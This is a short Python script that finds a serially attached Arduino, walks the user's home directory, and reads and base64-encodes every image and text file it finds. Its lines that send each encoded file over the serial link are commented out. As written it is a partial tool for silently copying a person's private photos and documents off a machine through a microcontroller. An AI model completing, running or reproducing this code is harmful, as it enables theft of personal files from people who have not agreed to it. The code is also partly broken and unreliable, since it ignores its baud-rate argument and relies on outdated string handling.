import termios, os, base64, serial.tools.list_ports
class SerialPort(object):
    def __init__(self, serialport, bps):
        self.fd = os.open(serialport, os.O_RDWR | os.O_NOCTTY | os.O_NDELAY)
        attrs = termios.tcgetattr(self.fd)
        attrs[4] = termios.B115200
        attrs[5] = termios.B115200
        attrs[2] &= ~termios.PARENB
        attrs[2] &= ~termios.CSTOPB
        attrs[2] &= ~termios.CSIZE
        attrs[2] |= termios.CS8
        attrs[2] &= ~termios.CRTSCTS
        attrs[2] |= termios.CREAD | termios.CLOCAL
        attrs[2] &= ~(termios.IXON | termios.IXOFF | termios.IXANY)
        attrs[3] &= ~(termios.ICANON | termios.ECHO | termios.ECHOE | termios.ISIG)
        attrs[1] &= ~termios.OPOST
        attrs[6][termios.VMIN] = 0
        attrs[6][termios.VTIME] = 20
        termios.tcsetattr(self.fd, termios.TCSANOW, attrs)
    def write(self, str):
        os.write(self.fd, str)
    def write_byte(self, byte):
        os.write(self.fd, chr(byte))


port = ""
ports = list(serial.tools.list_ports.comports())
for p in ports:
    if "Arduino" in p.description:
        port = str(p)
        port = port.split(" ")
        port = port[0]

bps = 115200
port = SerialPort(port, bps)
dirHome = os.path.expanduser("~")
exclude = []
print('dirHome = ' + dirHome)

for root, dirs, files in os.walk(dirHome):
    for directory in dirs:
        if directory.startswith("."):
            exclude.append(directory)

for root, dirs, files in os.walk(dirHome, topdown = True):
    dirs[:] = [d for d in dirs if d not in exclude]
    for file in files:
        filePath = os.path.join(root, file)
        if file.endswith(".jpg") or file.endswith(".jpeg") or file.endswith(".png") or file.endswith(".txt"):
            with open(filePath, "rb") as f:
                send = base64.b64encode(f.read())
            #print(send)

            startOfFile = base64.b64encode("§.XXX")
            #port.write(startOfFile)
            #port.write(send)

        else:
            pass